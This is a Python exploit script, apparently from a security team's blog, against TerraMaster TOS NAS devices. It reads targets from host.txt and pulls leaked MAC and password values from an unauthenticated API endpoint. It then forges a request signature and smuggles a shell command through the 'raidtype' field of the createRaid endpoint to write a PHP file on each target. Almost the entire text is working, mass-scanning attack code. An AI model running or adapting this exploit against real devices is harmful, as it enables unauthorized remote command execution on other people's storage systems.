import time, requests,re,hashlib,json

def title():
    print('''                                                                                                                                                                                                                                                   
                                            iiii                             tttt                                                  
                                           i::::i                         ttt:::t                                                  
                                            iiii                          t:::::t                                                  
                                                                          t:::::t                                                  
    ppppp   ppppppppp     aaaaaaaaaaaaa   iiiiiii nnnn  nnnnnnnn    ttttttt:::::ttttttt        eeeeeeeeeeee    rrrrr   rrrrrrrrr   
    p:::::::::::::::::p   aaaaaaaaa:::::a  i::::i n::::::::::::::nn t:::::::::::::::::t     e::::::eeeee:::::eer:::::::::::::::::r 
    pp::::::ppppp::::::p           a::::a  i::::i nn:::::::::::::::ntttttt:::::::tttttt    e::::::e     e:::::err::::::rrrrr::::::r
     p:::::p     p:::::p    aaaaaaa:::::a  i::::i   n:::::nnnn:::::n      t:::::t          e:::::::eeeee::::::e r:::::r     r:::::r
     p:::::p     p:::::p  aa::::::::::::a  i::::i   n::::n    n::::n      t:::::t          e:::::::::::::::::e  r:::::r     rrrrrrr
     p:::::p     p:::::p a::::aaaa::::::a  i::::i   n::::n    n::::n      t:::::t          e::::::eeeeeeeeeee   r:::::r            
     p:::::p    p::::::pa::::a    a:::::a  i::::i   n::::n    n::::n      t:::::t    tttttte:::::::e            r:::::r            
     p:::::ppppp:::::::pa::::a    a:::::a i::::::i  n::::n    n::::n      t::::::tttt:::::te::::::::e           r:::::r            
     p::::::::::::::::p a:::::aaaa::::::a i::::::i  n::::n    n::::n      tt::::::::::::::t e::::::::eeeeeeee   r:::::r                  
     p::::::pppppppp      aaaaaaaaaa  aaaaiiiiiiii  nnnnnn    nnnnnn          ttttttttttt      eeeeeeeeeeeeee   rrrrrrr            
     p:::::p                                                                                                                                                                                                                                            
    p:::::::p                                                                                                                      
    p:::::::p                                                                                                                
    p:::::::p                                    What is black and what is white                                                                              
    ppppppppp                                    blog： https://www.cnblogs.com/painter-sec  
                                                 Team： base64 安全团队                                                                                                                                                                                                                                              
    ''')

def usage():
    print("""
    用法：python3 TerraMaster TOS 信息泄露漏洞+RCE.py
    前提：在脚本所在文件夹下放入：host.txt  目标
    
    """)

def poc_getinfo(target):
    print("[+]正则检测：{}".format(target))
    headers = {"User-Agent": "TNAS"}
    payload = target + "/module/api.php?mobile/webNasIPS"
    try:
        req = requests.get(url=payload, headers=headers).content.decode("utf-8")
        if "successful" in req:
            print("[+]存在信息泄露漏洞：{}".format(payload))
            print('    [-]泄露信息：' + req)
            with open("poc1_vul.txt", "a+", encoding="utf-8") as f:
                f.write(payload + '\n')
            poc_execute(req,target)
    except:
        pass


def poc_execute(req,target):
    print("[+]开始进行命令执行检测---")
    req = str(req)
    mac = str(re.findall(r"ADDR:(.*?)\\", req)[0][-6:])
    authorization = re.findall(r"PWD:(.*?)\\", req)[0]
    timestamp = str(int(time.time()))
    signature = hashlib.md5((mac + timestamp).encode("utf-8")).hexdigest()
    data = {"raidtype": ';echo "<?php phpinfo();?>">vuln1.php', "diskstring": "XXXX"}
    headers = {"Authorization": authorization, "Signature": signature, "Timestamp": timestamp, "User-Agent": "TNAS"}
    payload = target+ '/module/api.php?mobile/createRaid'
    req2 = requests.post(url=payload,headers=headers,data=data).content.decode("utf-8")
    if "successful" in req2:
        print("[+]命令执行成功，成功写入phpinfo文件，文件地址：{}".format(target+'/module/vuln1.php'))


if __name__ == '__main__':
    title()
    usage()
    with open("host.txt", 'r', encoding="utf-8") as f:
        temp = f.readlines()
    for target in temp:  # 此处也可以遍历url文件
        target = target.strip().rstrip("/")
        poc_getinfo(target)